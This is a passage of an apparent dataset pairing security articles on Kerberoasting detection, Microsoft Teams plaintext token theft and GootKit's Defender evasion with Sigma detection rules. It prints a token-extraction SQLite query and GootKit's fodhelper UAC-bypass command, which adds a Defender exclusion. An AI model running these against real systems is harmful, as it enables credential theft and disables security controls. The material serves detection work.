activity is occurring and we know from which computer it's being done thanks to the event information (\"Client Address\").\n\n## Detecting Kerberoast Service Account Honeypot \"Access\"\n\nOnce the honeypot account is created with a service principal name that doesn't do anything it should therefore should never be requested or used. The reason this service principal name should never be requested is that we made it up and it isn't linked to any real application that would be requesting it. There is no reason for anyone to every request a Kerberos TGS service ticket for this since there is no actual associated service running for it. Therefore, if we see that someone requested a Kerberos TGS ticket, they are very likely attempting to Kerberoast this account.\n\nAn attacker gains access to the internal network and searches for accounts with service principal names and have admincount set to 1.\n\n```image\nAlt: Kerberoast discovery PowerShell script\nDescription: The image displays a PowerShell command output, showing filtered event data related to Kerberoasting activity. It includes the following fields: EventID (4769), Date (2/8/2017 7:54:21 AM), AccountName (JoeUser@LAB.ADCSECURITY.ORG), ClientAddress (::ffff:10.100.10.110), and ServiceName (KerberoastHONEY POT). This output is relevant for identifying unauthorized Kerberos ticket requests for a honeypot account, which is critical for detecting potential attacks.\nTranscription: |\n  PS C:\\Windows\\system32> $KerberoastEventData | where {$_.ServiceName -like \"*Honeypot*\"} | select EventID,Date,AccountName,ClientAddress,ServiceName\n  \n  EventID       : 4769\n  Date          : 2/8/2017 7:54:21 AM\n  AccountName   : JoeUser@LAB.ADSECURITY.ORG\n  ClientAddress : ::ffff:10.100.10.110\n  ServiceName   : KerberoastHONEY POT\n```\n\nThis shows our new honeypot account to the attacker who is now interested in this account and requests an RC4 encrypted Kerberos TGS ticket for the SPN. A `klist` shows the attacker got the TGS ticket in memory.\n\nBy looking for 4769 events on Domain Controllers with the ticket encryption option 0x12 (along with other filters I described earlier), we can see that Joe User requested a Kerberos ticket for a SPN that doesn't exist and should never be requested! The Account Name shows which account was used and Client Address provides the computer IP from where the attacker requested the honeypot Kerberos service account.\n\n## Conclusion\n\nKerberoasting requires requesting Kerberos TGS service tickets with RC4 encryption which shouldn't be regular activity on a network. Logging 4769 events on Domain Controllers, filtering these events by ticket encryption type (0x17), known service accounts (Account Name field) & computers (Service Name field) greatly reduces the number of events forwarded to the central logging and alerting system. Gathering and monitoring this data also creates a good baseline of what's \"normal\" in order to more easily detect anomalous activity.\n\nDetecting Kerberoasting activity is possible by logging the correct activity on Domain Controllers. Determining if this activity is malicious requires in-depth knowledge of how RC4 TGS tickets are used in the environment. Creating a service account honeypot with a SPN that doesn't do anything provides another data point. Any Kerberos ticket request involving the honeypot service account should be seen as malicious.\n\n## Kerberoasting References\n\n- Detecting Kerberoasting Activity (part 1)\n- Detecting Kerberoasting Activity Part 2 – Creating a Kerberoast Service Account Honeypot\n- Cracking Kerberos TGS Tickets Using Kerberoast – Exploiting Kerberos to Compromise the Active Directory Domain\n- Attack Methods for Gaining Domain Admin Rights in Active Directory\n- Sneaky Persistence Active Directory Trick #18: Dropping SPNs on Admin Accounts for Later Kerberoasting\n- Targeted Kerberoasting (Harmj0y)\n- Kerberoasting without Mimikatz (Harmj0y)\n- Roasting AS REPs (Harmj0y)\n- Sean Metcalf’s Presentations on Active Directory Security\n- Kerberoast (GitHub)\n- Tim Medin’s DerbyCon “Attacking Microsoft Kerberos Kicking the Guard Dog of Hades” presentation in 2014 (slides & video)",
    "sigma_rule": {
      "title": "Suspicious Kerberos RC4 Ticket Encryption",
      "id": "496a0e47-0a33-4dca-b009-9e6ca3591f39",
      "status": "test",
      "description": "Detects service ticket requests using RC4 encryption type",
      "references": [
        "https://adsecurity.org/?p=3458",
        "https://www.trimarcsecurity.com/single-post/TrimarcResearch/Detecting-Kerberoasting-Activity"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2017-02-06",
      "modified": "2022-06-19",
      "tags": [
        "attack.credential-access",
        "attack.t1558.003"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection": {
          "EventID": 4769,
          "TicketOptions": "0x40810000",
          "TicketEncryptionType": "0x17"
        },
        "reduction": {
          "ServiceName|endswith": "$"
        },
        "condition": "selection and not reduction"
      },
      "falsepositives": [
        "Service accounts used on legacy systems (e.g. NetApp)",
        "Windows Domains with DFL 2003 and legacy systems"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_susp_rc4_kerberos.yml",
    "id": "786"
  },
  {
    "url": "https://web.archive.org/web/20230726144455/https://www.vectra.ai/blogpost/undermining-microsoft-teams-security-by-mining-tokens",
    "markdown": "# Undermining Microsoft Teams Security by Mining Tokens\n\n**September 13, 2022**\n\n## Overview\n\nIn August 2022, the Vectra Protect team identified a post-exploitation opportunity allowing malicious actors with sufficient local or remote file system access to steal valid user credentials from Microsoft Teams due to their plaintext storage on disk. This plaintext credential management was determined to impact all commercial and GCC Desktop Teams clients for Windows, Mac, and Linux.\n\nWhile credential harvesting from memory is a common post-exploitation step, we believe that lowering the bar necessary to harvest creds down to just simple read access to the file system expands opportunities for an adversary, simplifies their task, and is particularly interesting when stolen credentials offer an opportunity to retain user access unencumbered by otherwise pesky Multi-Factor Authentication (MFA) speedbumps.\n\nWith these tokens, attackers can assume the token holder’s identity for any actions possible through the Microsoft Teams client, including using that token for accessing Microsoft Graph API functions from an attacker’s system. Additionally, these tokens are equally valid with MFA-enabled accounts, creating an allowance to bypass MFA checks during ongoing use.\n\nMicrosoft is aware of this issue but indicated it did not meet their bar for immediate servicing. Until Microsoft moves to update the Teams Desktop Application, we believe customers should be aware of the risks posed by plaintext token storage and mitigate that risk by instrumenting monitoring for unusual file access or modification to file system ACLs.\n\n## The Genesis of the Hunt\n\nThe investigation kicked off when a Vectra Protect customer complained about how Microsoft Teams manages disabled identities. End users cannot remove deactivated accounts through the UI because the Teams application requires the account to be signed in to remove it from the client. Of course, users cannot do this when their user account is disabled. To help resolve this issue, we began to look at the local configuration data inside the Teams client and unravel how it works.\n\n## Electron – a Security Negative\n\nMicrosoft Teams is an Electron-based app. Electron works by creating a web application that runs through a customized browser. This is very convenient and makes development quick and easy. However, running a web browser within the context of an application requires traditional browser data like cookies, session strings, and logs.\n\nThis is where the root of this issue lies as Electron does not support standard browser controls like encryption, and system-protected file locations are not supported by Electron out of the box but must be managed effectively to remain secure. Therefore, by default the way Electron works incentivizes creating overly transparent applications. Since Electron obfuscates the complexities of creating the application, it is safe to assume that some developers may be unaware of the ramifications of their design decisions and it is common to hear application security researchers bemoan the use of this framework due to critical security oversights.\n\n## Diving into the Structure\n\nWe first began to explore methods to expunge any references to the logged-in account(s). Our goal was to remove the old accounts and force Teams to operate as if they were gone. Multiple attempts to modify the configuration file and first-time run files amounted to nothing. As a stab in the dark, we searched for the known user principal name, and two critical files returned.\n\nThe first important file was an ldb file with access tokens in clear text. Upon review, it was determined that these access tokens were active and not an accidental dump of a previous error. These access tokens gave us access to the Outlook and Skype APIs. It is important to know that the Microsoft Teams architecture is a conglomeration of a wide variety of M365 services that relies on Skype, SharePoint, and Outlook to function—this explains the presence of these tokens.\n\n```image\nAlt: Undermining 1\nDescription: The image shows a command line output, likely from a terminal or command prompt, displaying a URL associated with Microsoft Teams and a token labeled 'skypeToken'. The token appears in a JSON-like format, indicating its key and value. This output is relevant in the context of the article, highlighting the discovery of active access tokens, which are critical for understanding vulnerabilities in Microsoft Teams security.\nTranscription: |\n  GET https://teams.microsoft.com/lts.64999auc-seb4-453d-b124-b1277d2b86c.auth.skype.token?f='skypeToken':'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ...'\n```\n\nThe next file is a browser Cookies database like the “Cookies” we agree to on every website (thanks, GDPR). Cookies store data like session information, marketing tags, account information, and in some instances, access tokens. (un)Fortunately, the Teams Desktop application is storing the tokens here as well.\n\n```image\nAlt: Undermining 2\nDescription: The image shows a section of a database or configuration file, likely related to Microsoft Teams. It contains a structured format displaying URLs and a token labeled 'Bearer' which appears to be an access token. The format suggests it is part of a log or data dump showing various properties associated with Microsoft Teams authentication, possibly indicating security vulnerabilities regarding stored tokens.\nTranscription: |\n  /DINKD: teams.microsoft.com/clienttype=windows/ /{GK}h: /E8K[<TOKEN_VALUE>]  B\n  /E8K: teams.microsoft.com/auth/token Bearer 3DeyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyX2lkIjoi...\n```\n\nThe best way to read the Cookie DB is to use a sqlite3 database client. With this client, we can extract just the values we need. The following query returns the token's name and the token value.\n\n```image\nAlt: Undermining 3\nDescription: The image displays a command-line interface (CLI) output from a SQLite database query. The query being executed is: `SELECT name, value FROM Cookies WHERE name LIKE '%token%';`. This query aims to extract the names and values of cookies that contain the term 'token.' The context suggests this is part of an effort to identify access tokens related to Microsoft Teams, indicating the image is relevant to the analysis of security vulnerabilities in the application.\nTranscription: |\n  sql\n  sqlite> SELECT name, value FROM Cookies WHERE name LIKE \"%token%\";\n```\n\nWe evaluated each token against the Microsoft jwt validation service, https://jwt.ms. Each token we found was active and worked without requiring additional authentication. The realization began to dawn that the initial problem of having to re-install teams was a much smaller issue than the identity abuse opportunity potentially looming in the Microsoft Teams client.\n\n## Let’s Do Something\n\nThe team set to work with this knowledge and began to craft tooling that took advantage of these unprotected credentials. After considering multiple options, it was determined that sending a message to the account of the credential holder through Teams with an access token would be appropriate. With this goal in mind, we launched the Teams client in the browser to track API calls when sending messages and found this gem:\n\n`https://amer.ng.msg.teams.microsoft.com/v1/users/ME/conversations/48:notes/messages`\n\nThis API endpoint lets us send messages to ourselves, and we do not have to futz around with account enumeration. Next, we needed the access token. We used the SQLite engine. SQLite does not require installation, so the tooling downloads SQLite to a local folder and executes it to read the Cookies DB, where we extract the Skype Access token required for sending messages.\n\nWith the token in hand and our destination in mind, the last piece was to string together a message. The request body took some time to get working, but we eventually succeeded. We set the message to send with the high importance flag set, and the subject of “You’ve Been PWND.” The message itself is the Skype Access Token.\n\n```image\nAlt: Undermining 6\nDescription: The image displays a code snippet related to sending a message through Microsoft Teams using an access token. It includes key-value pairs such as 'content', 'messageType', 'importance', and 'subject', showing how the message is structured for high importance and is labeled as 'You've Been PWND'. This snippet is relevant to the context of extracting and utilizing credentials.\nTranscription: |\n  {\n    content = \"<p>$Token</p>\"\n    messagetype = \"RichText/Html\"\n    contenttype = \"text\"\n    amsreferences = @()\n    clientmessageid = $id\n    imdisplayname = \"Threat Bot\"\n    properties = @{\n      importance = \"high\"\n      subject = \"You've Been PWND\"\n    }\n  }\n```\n\nThe tool sends the message at this point, and we can validate that the access token is in our personal chat.\n\n```image\nAlt: Undermining 4\nDescription: The image displays a chat message in a messaging application (likely Microsoft Teams), which contains a highlighted text labeled \"IMPORTANT!!\" followed by a string of text that appears to be a Skype access token. The message indicates the significance of the token, suggesting it is meant to be noticed and potentially used for malicious purposes.\nTranscription: |\n  8/8 2:26 PM\n  IMPORTANT!!\n  skypetoken=eyJhbGciOiJSUzI1NiIsImtpZCI6IjC6Im9QMWFxQnlfr3hZUpSaXhuQ25zdESP\n  IJ2z2dksB5cGklpXCI9eXOiOiF2NT5N5iN4i9mV4cIGMTY2MDA1NDI2M2wi2t5GvZ7GIl\n```\n\nNot too shabby for a morning’s work.\n\n## The Implications of Unsecured Credentials\n\nMicrosoft stores these credentials to create a seamless single sign-on experience within the desktop application. However, the implementation of these security choices lowers the bar.\n\nAnyone who installs and uses the Microsoft Teams client in this state is storing the credentials needed to perform any action possible through the Teams UI, even when Teams is shut down. When these tokens are stolen, it enables attackers to modify SharePoint files, Outlook mail and calendars, and Teams chat files. Attackers can tamper with legitimate communications within an organization by selectively destroying, exfiltrating, or engaging in targeted phishing attacks.\n\n## The Big Scary – The Ultimate Phish\n\nHere the thing that truly frightens us is the proliferation of post-MFA user tokens across an environment – it enables subsequent attacks that do not require additional special permissions or advanced malware to get away with major internal damage. With enough compromised machines, attackers can orchestrate communications within an organization. Assuming full control of critical seats–like a company’s Head of Engineering, CEO, or CFO—attackers can convince users to perform tasks damaging to the organization. How do you practice phish testing for this?\n\n## Recommendations\n\n### To Administrators\n\n#### Baseline Teams, Manage Configurations, and Monitor ACL Changes\n\nTreat teams as a critical application and baseline and enforce the ACLs that protect it. Modification of these ACLs to extend read file access outside of the intended user will effectively expose that user’s credentials to any of the malicious actions emphasized above.\n\nOnce Microsoft has updated the Electron Teams applications, it is still critical to move to a high-restriction model for preventing the installation of unauthorized Teams Apps, bots, connectors, etc.\n\n#### Track File Access\n\nCreate a system monitoring rule to identify the processes accessing these sensitive files. There are two specific file/folder recommendations:\n\n- [Windows] `%AppData%\\Microsoft\\Teams\\Cookies`\n- [Windows] `%AppData%\\Microsoft\\Teams\\Local Storage\\leveldb`\n- [macOS] `~/Library/Application Support/Microsoft/Teams/Cookies`\n- [macOS] `~/Library/Application Support/Microsoft/Teams/Local Storage/leveldb`\n- [Linux] `~/.config/Microsoft/Microsoft Teams/Cookies`\n- [Linux] `~/.config/Microsoft/Microsoft Teams/Local Storage/leveldb`\n\nIf any process other than Teams.exe accesses these files, it indicates that the stored data is being accessed outside the context of the Teams application.\n\n```image\nAlt: Undermining 5\nDescription: The image depicts a security event log detailing an attempt to access a file related to Microsoft Teams. It includes specific identifiers such as the Security ID, Account Name, Account Domain, and Logon ID associated with the user account. The Object section lists the details of the targeted file, including the Object Server, Object Type, and the Object Name, which specifies the path to the Cookies file within the Teams application. Additionally, the Process Information section provides the Process ID and Process Name, indicating that this access attempt was made by the Teams executable itself.\nTranscription: |\n  An attempt was made to access an object.\n  Subject:\n      Security ID: VECTRA\\cpeoples\n      Account Name: cpeoples\n      Account Domain: VECTRA\n      Logon ID: 0x40B600\n  \n  Object:\n      Object Server: Security\n      Object Type: File\n      Object Name: C:\\Users\\cpeoples\\AppData\\Roaming\\Microsoft\\Teams\\Cookies\n      Handle ID: 0x48c\n      Resource Attributes: S:AI\n  \n  Process Information:\n      Process ID: 0x4380\n      Process Name: C:\\Users\\cpeoples\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe\n```\n\n#### Consider the Web App as an Alternative\n\nIf baselining and monitoring is impractical, consider using the web-based Teams client inside Microsoft Edge, which has multiple OS-level controls to protect token leaks. Fortunately, the Teams web application is robust and supports most features enabled through the desktop client, keeping organization productivity impacts to a minimum.\n\nFor Linux users, this is the recommended path full stop as Microsoft has announced the end of life for Teams for Linux by December 2022.\n\n### To Developers\n\nIf you must use Electron for your application, ensure you securely store OAuth tokens. One such method for storing secrets is to use the package KeyTar, which leverages local OS security mechanisms for secret management.\n\nHow to securely store sensitive information in Electron with node-keytar | by Cameron Nokes | Medium\n\n### To Microsoft\n\nIf you must store the tokens, do so in an encrypted fashion and raise the bar from a simple read access on the file system to requiring some ongoing access to memory. And please let us remove disabled accounts from the Teams app(s) without having to do a full uninstall/re-install.\n\n### To Security Teams\n\nTo stop an attacker that would leverage this type of exploit, teams should invest in threat detection, and response solutions that can see the kinds of actions before and after the exploit are leveraged. Vectra’s threat detection and response platform would detect command and control tactics that would be expected before this exploit and any network reconnaissance, lateral movement, or exfiltration that would occur after the exploit. In the cloud, Vectra would alert on the attacker’s activities using the compromised credentials in Azure AD, including privileged in Azure AD, full-scale attacks against connected cloud service providers like AWS, and attacks against other Microsoft 365 applications, including Exchange, SharePoint, and Power Automate.\n\n#### Threat Detection and Response for your Azure AD\n\nTo learn more about how Vectra can see and stop threats please visit:\nhttps://www.vectra.ai/attack-surface/azure-ad",
    "sigma_rule": {
      "title": "Suspicious Teams Application Related ObjectAcess Event",
      "id": "25cde13e-8e20-4c29-b949-4e795b76f16f",
      "status": "test",
      "description": "Detects an access to authentication tokens and accounts of Microsoft Teams desktop application.",
      "references": [
        "https://www.bleepingcomputer.com/news/security/microsoft-teams-stores-auth-tokens-as-cleartext-in-windows-linux-macs/",
        "https://web.archive.org/web/20230726144455/https://www.vectra.ai/blogpost/undermining-microsoft-teams-security-by-mining-tokens"
      ],
      "author": "@SerkinValery",
      "date": "2022-09-16",
      "tags": [
        "attack.credential-access",
        "attack.t1528"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection": {
          "EventID": 4663,
          "ObjectName|contains": [
            "\\Microsoft\\Teams\\Cookies",
            "\\Microsoft\\Teams\\Local Storage\\leveldb"
          ]
        },
        "filter": {
          "ProcessName|contains": "\\Microsoft\\Teams\\current\\Teams.exe"
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_teams_suspicious_objectaccess.yml",
    "id": "789"
  },
  {
    "url": "https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/",
    "markdown": "# GootKit Malware Bypasses Windows Defender by Setting Path Exclusions\n\nSeptember 6, 2019\n\nAs Windows Defender matures and becomes tightly integrated into Windows 10, malware writers are creating techniques to evade its detection. Such is the case with the GootKit banking Trojan, which uses a UAC bypass and WMIC commands to exclude the malware executable from being scanned by Windows Defender Antivirus.\n\nGootKit is a banking Trojan that attempts to steal the online banking credentials of infected users through video capture and redirects to fake banking sites under the attacker's control. An interesting aspect of this infection is that it is a Node JS application packaged into an executable.\n\nAfter analyzing a recent GootKit sample found by JamesWT, malware researcher and reverse engineer Vitali Kremez found that GootKit is attempting to bypass detections by Windows Defender by excluding the malware path from scanning.\n\nIn code provided to BleepingComputer by Kremez, we can see that the GootKit first checks if Windows Defender is enabled by issuing the following command:\n\n```\nWMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName,productState /format:list\n```\n\n```image\nAlt: Check if Windows Defender is Enabled\nDescription: The image displays a snippet of code written in JavaScript. This code appears to be part of a function called 'getAv' which executes a Windows Management Instrumentation (WMI) command to check the status of antivirus products on a local machine. The command specifically queries the Windows Security Center for the display name and product state of the antivirus software. The command is executed in a hidden window, and any output or error messages are handled within the function.\nTranscription: |\n  function getAv(onDone) {\n      let strAv = '';\n      logIt(\"GetAV processing...\");\n      let cmdline = 'WMIC /Node:localhost /Namespace:\\\\root\\\\SecurityCenter2 Path AntiVirusProduct Get displayName, productState /format:list';\n      execFile(cmd, ['/c', cmdline], {\n          timeout: 30000,\n          windowsHide: true,\n          windowsVerbatimArguments: true\n      }, function(err, stdout, stderr) {\n          if (err) {\n              logIt('GetAV EXEC_ERROR: ' + err.message);\n              return onDone(err, '');\n          }\n      });\n  }\n```\n\n**Check if Windows Defender is Enabled**\n\nIf it is enabled, the malware will now execute a command that creates Registry values that will be executed as part of a UAC bypass using the `C:\\Windows\\system32\\fodhelper.exe` executable.\n\n```image\nAlt: UAC Bypass using Fodhelper.exe\nDescription: The image displays a block of code related to registry modifications and commands used by the GootKit malware to bypass Windows Defender. The code shows commands for adding registry entries that enable a UAC bypass and exclude a specified path from Windows Defender scanning. It includes the use of WMIC commands to interact with Windows Defender settings and demonstrates how the malware manipulates system settings to evade detection.\nTranscription: |\n  reg add HKCU\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command /f /v DelegateExecute /d \"\" /t REG_SZ && reg add HKCU\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command /f /d \"cmd /c start /min WMIC /Namespace:\\\\\\\\root\\\\Microsoft\\\\Windows\\\\Defender class MSFT_MpPreference call Add ExclusionPath=\\\"\" + excludeDir + \"\\\" /t REG_SZ && %SystemRoot%\\\\system32\\\\fodhelper.exe & ping -n 7 127.0.0.1 > NUL & reg delete HKCU\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command /f\n```\n\n**UAC Bypass using Fodhelper.exe**\n\nEssentially, the above command will perform the following steps:\n\n1. Create the `HKCU\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command \"DelegateExecute\"=0` value, which is needed for the bypass.\n2. Create the `HKCU\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command` value so it points to a command that whitelists the malware executable's path. It does this using the command:\n\n   ```\n   WMIC /Namespace:\\\\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Add ExclusionPath=\"' + excludeDir + '\"\n   ```\n\n3. Executes the command `C:\\Windows\\System32\\fodhelper.exe`, which will execute the WMIC command above without showing a UAC prompt.\n4. It will then ping the loopback address 7 times to create a delay.\n5. Finally, it deletes the value with the WMIC command from the Registry.\n\nAt this point, Windows Defender will no longer scan the path where the executable is located.\n\nFinally, GootKit will confirm that the bypass was enabled by executing the following WMIC command:\n\n```\nWMIC /Node:localhost /Namespace:\\\\root\\Microsoft\\Windows\\Defender Path MSFT_MpPreference Get * /format:list | findstr /i \"DisableRealtimeMonitoring ExclusionPath ExclusionProcess MAPSReporting SubmitSamplesConsent\"\n```\n\nThis command will return a list of Windows Defender preferences that can be used to determine if Windows Defender is active.\n\nAs you can see below, the ExclusionPath has been set to `{\"\\temp\\\"}`, which means that the path is excluded from scanning. The Temp folder is just an illustration and the path may change with an actual infection.\n\n```image\nAlt: Check for exclusion\nDescription: The image depicts a command prompt window displaying the output of a WMIC command related to Windows Defender settings. The command retrieves various preferences from the Windows Defender configuration, specifically focusing on 'DisableRealtimeMonitoring', 'ExclusionPath', 'ExclusionProcess', 'MAPSReporting', and 'SubmitSamplesConsent'. The output shows that real-time monitoring is disabled (set to FALSE), the exclusion path is set to '{\\temp\\}', and indicates values for MAPS reporting and sample consent.\nTranscription: |\n  C:\\test>WMIC /Node:localhost /Namespace:\\\\root\\Microsoft\\Windows\\Defender Path MSFT_MpPreference Get * /format:list | findstr /i \"DisableRealtimeMonitoring ExclusionPath ExclusionProcess MAPSReporting SubmitSamplesConsent\"\n  DisableRealtimeMonitoring=FALSE\n  ExclusionPath={\"temp\"}\n  ExclusionProcess=\n  MAPSReporting=2\n  SubmitSamplesConsent=1\n  C:\\test>\n```\n\n**Check for exclusion**\n\nWith this exclusion in place, even if Microsoft starts detecting the particular GootKit sample in the future, its path will be excluded and will not be detected by the security software.\n\nGootKit is not the only Trojan stepping up their game to evade Microsoft's greatly improved Windows Defender antivirus product. In July, we reported that TrickBot had started executing PowerShell commands to disable Windows Defender's functionality and to evade detection.\n\n## Related Articles:\n\n- Android malware \"FakeCall\" now reroutes bank calls to attackers\n- TrickMo malware steals Android PINs using fake lock screen\n- New Octo Android malware version impersonates NordVPN, Google Chrome\n- North Korean hackers use new macOS malware against crypto firms\n- Hackers increasingly use Winos4.0 post-exploitation kit in attacks",
    "sigma_rule": {
      "title": "Windows Defender Exclusion List Modified",
      "id": "46a68649-f218-4f86-aea1-16a759d81820",
      "related": [
        {
          "id": "e9c8808f-4cfb-4ba9-97d4-e5f3beaa244d",
          "type": "derived"
        },
        {
          "id": "a33f8808-2812-4373-ae95-8cfb82134978",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects modifications to the Windows Defender exclusion registry key. This could indicate a potentially suspicious or even malicious activity by an attacker trying to add a new exclusion in order to bypass security.\n",
      "references": [
        "https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/"
      ],
      "author": "@BarryShooshooga",
      "date": "2019-10-26",
      "modified": "2023-11-11",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "Requirements: Audit Policy : Security Settings/Local Policies/Audit Policy, Registry System Access Control (SACL): Auditing/User"
      },
      "detection": {
        "selection": {
          "EventID": 4657,
          "ObjectName|contains": "\\Microsoft\\Windows Defender\\Exclusions\\"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Intended exclusions by administrators"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_windows_defender_exclusions_registry_modified.yml",
    "id": "793"
  },
  {
    "url": "https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/",
    "markdown": "# GootKit Malware Bypasses Windows Defender by Setting Path Exclusions\n\nSeptember 6, 2019\n\nAs Windows Defender matures and becomes tightly integrated into Windows 10, malware writers are creating techniques to evade its detection. Such is the case with the GootKit banking Trojan, which uses a UAC bypass and WMIC commands to exclude the malware executable from being scanned by Windows Defender Antivirus.\n\nGootKit is a banking Trojan that attempts to steal the online banking credentials of infected users through video capture and redirects to fake banking sites under the attacker's control. An interesting aspect of this infection is that it is a Node JS application packaged into an executable.\n\nAfter analyzing a recent GootKit sample found by JamesWT, malware researcher and reverse engineer Vitali Kremez found that GootKit is attempting to bypass detections by Windows Defender by excluding the malware path from scanning.\n\nIn code provided to BleepingComputer by Kremez, we can see that the GootKit first checks if Windows Defender is enabled by issuing the following command:\n\n```\nWMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName,productState /format:list\n```\n\n```image\nAlt: Check if Windows Defender is Enabled\nDescription: The image displays a snippet of code written in JavaScript. This code appears to be part of a function called 'getAv' which executes a Windows Management Instrumentation (WMI) command to check the status of antivirus products on a local machine. The command specifically queries the Windows Security Center for the display name and product state of the antivirus software. The command is executed in a hidden window, and any output or error messages are handled within the function.\nTranscription: |\n  function getAv(onDone) {\n      let strAv = '';\n      logIt(\"GetAV processing...\");\n      let cmdline = 'WMIC /Node:localhost /Namespace:\\\\root\\\\SecurityCenter2 Path AntiVirusProduct Get displayName, productState /format:list';\n      execFile(cmd, ['/c', cmdline], {\n          timeout: 30000,\n          windowsHide: true,\n          windowsVerbatimArguments: true\n      }, function(err, stdout, stderr) {\n          if (err) {\n              logIt('GetAV EXEC_ERROR: ' + err.message);\n              return onDone(err, '');\n          }\n      });\n  }\n```\n\n**Check if Windows Defender is Enabled**\n\nIf it is enabled, the malware will now execute a command that creates Registry values that will be executed as part of a UAC bypass using the `C:\\Windows\\system32\\fodhelper.exe` executable.\n\n```image\nAlt: UAC Bypass using Fodhelper.exe\nDescription: The image displays a block of code related to registry modifications and commands used by the GootKit malware to bypass Windows Defender. The code shows commands for adding registry entries that enable a UAC bypass and exclude a specified path from Windows Defender scanning. It includes the use of WMIC commands to interact with Windows Defender settings and demonstrates how the malware manipulates system settings to evade detection.\nTranscription: |\n  reg add HKCU\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command /f /v DelegateExecute /d \"\" /t REG_SZ && reg add HKCU\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command /f /d \"cmd /c start /min WMIC /Namespace:\\\\\\\\root\\\\Microsoft\\\\Windows\\\\Defender class MSFT_MpPreference call Add ExclusionPath=\\\"\" + excludeDir + \"\\\" /t REG_SZ && %SystemRoot%\\\\system32\\\\fodhelper.exe & ping -n 7 127.0.0.1 > NUL & reg delete HKCU\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command /f\n```\n\n**UAC Bypass using Fodhelper.exe**\n\nEssentially, the above command will perform the following steps:\n\n1. Create the `HKCU\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command \"DelegateExecute\"=0` value, which is needed for the bypass.\n2. Create the `HKCU\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command` value so it points to a command that whitelists the malware executable's path. It does this using the command:\n\n   ```\n   WMIC /Namespace:\\\\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Add ExclusionPath=\"' + excludeDir + '\"\n   ```\n\n3. Executes the command `C:\\Windows\\System32\\fodhelper.exe`, which will execute the WMIC command above without showing a UAC prompt.\n4. It will then ping the loopback address 7 times to create a delay.\n5. Finally, it deletes the value with the WMIC command from the Registry.\n\nAt this point, Windows Defender will no longer scan the path where the executable is located.\n\nFinally, GootKit will confirm that the bypass was enabled by executing the following WMIC command:\n\n```\nWMIC /Node:localhost /Namespace:\\\\root\\Microsoft\\Windows\\Defender Path MSFT_MpPreference Get * /format:list | findstr /i \"DisableRealtimeMonitoring ExclusionPath ExclusionProcess MAPSReporting SubmitSamplesConsent\"\n```\n\nThis command will return a list of Windows Defender preferences that can be used to determine if Windows Defender is active.\n\nAs you can see below, the ExclusionPath has been set to `{\"\\temp\\\"}`, which means that the path is excluded from scanning. The Temp folder is just an illustration and the path may change with an actual infection.\n\n```image\nAlt: Check for exclusion\nDescription: The image depicts a command prompt window displaying the output of a WMIC command related to Windows Defender settings. The command retrieves various preferences from the Windows Defender configuration, specifically focusing on 'DisableRealtimeMonitoring', 'ExclusionPath', 'ExclusionProcess', 'MAPSReporting', and 'SubmitSamplesConsent'. The output shows that real-time monitoring is disabled (set to FALSE), the exclusion path is set to '{\\temp\\}', and indicates values for MAPS reporting and sample consent.\nTranscription: |\n  C:\\test>WMIC /Node:localhost /Namespace:\\\\root\\Microsoft\\Windows\\Defender Path MSFT_MpPreference Get * /format:list | findstr /i \"DisableRealtimeMonitoring ExclusionPath ExclusionProcess MAPSReporting SubmitSamplesConsent\"\n  DisableRealtimeMonitoring=FALSE\n  ExclusionPath={\"temp\"}\n  ExclusionProcess=\n  MAPSReporting=2\n  SubmitSamplesConsent=1\n  C:\\test>\n```\n\n**Check for exclusion**\n\nWith this exclusion in place, even if Microsoft starts detecting the particular GootKit sample in the future, its path will be excluded and will not be detected by the security software.\n\nGootKit is not the only Trojan stepping up their game to evade Microsoft's greatly improved Windows Defender antivirus product. In July, we reported that TrickBot had started executing PowerShell commands to disable Windows Defender's functionality and to evade detection.\n\n## Related Articles:\n\n- Android malware \"FakeCall\" now reroutes bank calls to attackers\n- TrickMo malware steals Android PINs using fake lock screen\n- New Octo Android malware version impersonates NordVPN, Google Chrome\n- North Korean hackers use new macOS malware against crypto firms\n- Hackers increasingly use Winos4.0 post-exploitation kit in attacks",
    "sigma_rule": {
      "title": "Windows Defender Exclusion Registry Key - Write Access Requested",
      "id": "e9c8808f-4cfb-4ba9-97d4-e5f3beaa244d",
      "related": [
        {
